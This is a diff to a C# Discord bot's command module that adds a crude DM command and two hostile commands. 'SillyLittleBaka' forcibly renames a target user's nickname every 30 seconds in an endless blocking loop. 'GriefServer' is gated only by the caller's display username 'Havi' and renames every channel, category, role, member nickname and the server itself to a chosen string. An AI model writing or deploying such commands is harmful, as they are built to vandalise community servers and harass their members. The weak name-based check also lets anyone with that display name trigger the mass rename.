@@ -1,6 +1,7 @@
 ﻿using Discord;
 using Discord.Commands;
 using System;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace ChonccDiscordBot.Modules
@@ -142,6 +143,85 @@ namespace ChonccDiscordBot.Modules
         public async Task JohnPaulAsync()
         {
             await ReplyAsync("https://www.reddit.com/r/TeemoTalk/");
+        }
+
+        [Command("Cum")]
+        public async Task CumAsync()
+        {
+            await Context.User.SendMessageAsync("Cum").ConfigureAwait(false);
+        }
+
+        [Command("SillyLittleBaka")]
+        public async Task SillyLittleBakaCommand(string user = null)
+        {
+            if(user != null)
+            {
+                int length = user.Length - 4;
+
+                string userID = user.Substring(3, length);
+
+                var socketUser = Context.Guild.GetUser(ulong.Parse(userID));
+
+                while (user != null)
+                {
+                    try
+                    {
+                        await socketUser.ModifyAsync(x => x.Nickname = "Silly Little BAKA").ConfigureAwait(false);
+                    }
+                    catch(Exception e)
+                    {
+                        return;
+                    }
+                    Thread.Sleep(30000);
+                }
+            }           
+        }
+
+        [Command("GriefServer")]
+        public async Task GriefServerAsync(string griefName)
+        {           
+
+            if (!Context.User.Username.Equals("Havi"))
+            {
+                return;
+            }
+
+            foreach (var channel in Context.Guild.TextChannels)
+            {
+                await channel.ModifyAsync(x => x.Name = griefName);
+            }
+            foreach (var channel in Context.Guild.VoiceChannels)
+            {
+                await channel.ModifyAsync(x => x.Name = griefName);
+            }
+            foreach (var channel in Context.Guild.CategoryChannels)
+            {
+                await channel.ModifyAsync(x => x.Name = griefName);
+            }
+
+            await Context.Guild.ModifyAsync(x => x.Name = griefName);
+
+            foreach (var role in Context.Guild.Roles)
+            {
+                try
+                {
+                    await role.ModifyAsync(x => x.Name = griefName);
+                }
+                catch (Exception e) { continue; }
+            }
+                     
+            foreach (var user in Context.Guild.Users)
+            {
+                try
+                {              
+                    await user.ModifyAsync(x => x.Nickname = griefName);
+                }
+                catch(Exception e) 
+                { 
+                    continue; 
+                }
+            }
+
         }
     }
 }
